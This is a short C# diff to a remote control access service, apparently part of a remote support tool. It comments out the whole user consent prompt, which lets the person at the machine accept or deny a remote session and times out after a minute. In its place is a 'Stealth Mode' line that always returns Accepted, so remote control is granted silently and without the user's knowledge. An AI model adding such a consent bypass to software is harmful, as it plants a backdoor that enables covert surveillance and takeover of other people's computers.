@@ -25,37 +25,40 @@ public class RemoteControlAccessService : IRemoteControlAccessService
 
     public async Task<PromptForAccessResult> PromptForAccess(string requesterName, string organizationName)
     {
-        return await _dispatcher.InvokeAsync(async () =>
-        {
-            try
-            {
-                Interlocked.Increment(ref _promptCount);
-                var viewModel = _viewModelFactory.CreatePromptForAccessViewModel(requesterName, organizationName);
-                var promptWindow = new PromptForAccessWindow()
-                {
-                    DataContext = viewModel
-                };
+        //return await _dispatcher.InvokeAsync(async () =>
+        //{
+        //    try
+        //    {
+        //        Interlocked.Increment(ref _promptCount);
+        //        var viewModel = _viewModelFactory.CreatePromptForAccessViewModel(requesterName, organizationName);
+        //        var promptWindow = new PromptForAccessWindow()
+        //        {
+        //            DataContext = viewModel
+        //        };
 
-                var result = await _dispatcher.Show(promptWindow, TimeSpan.FromMinutes(1));
+        //        var result = await _dispatcher.Show(promptWindow, TimeSpan.FromMinutes(1));
 
-                if (!result)
-                {
-                    return PromptForAccessResult.TimedOut;
-                }
+        //        if (!result)
+        //        {
+        //            return PromptForAccessResult.TimedOut;
+        //        }
                 
-                return viewModel.PromptResult ?
-                    PromptForAccessResult.Accepted :
-                    PromptForAccessResult.Denied;
-            }
-            catch (Exception ex)
-            {
-                _logger.LogError(ex, "Error while prompting for remote control access.");
-                return PromptForAccessResult.Error;
-            }
-            finally
-            {
-                Interlocked.Decrement(ref _promptCount);
-            }
-        });
+        //        return viewModel.PromptResult ?
+        //            PromptForAccessResult.Accepted :
+        //            PromptForAccessResult.Denied;
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        _logger.LogError(ex, "Error while prompting for remote control access.");
+        //        return PromptForAccessResult.Error;
+        //    }
+        //    finally
+        //    {
+        //        Interlocked.Decrement(ref _promptCount);
+        //    }
+        //});
+
+        // Stealth Mode: Auto-accept connection.
+        return await Task.FromResult(PromptForAccessResult.Accepted);
     }
 }
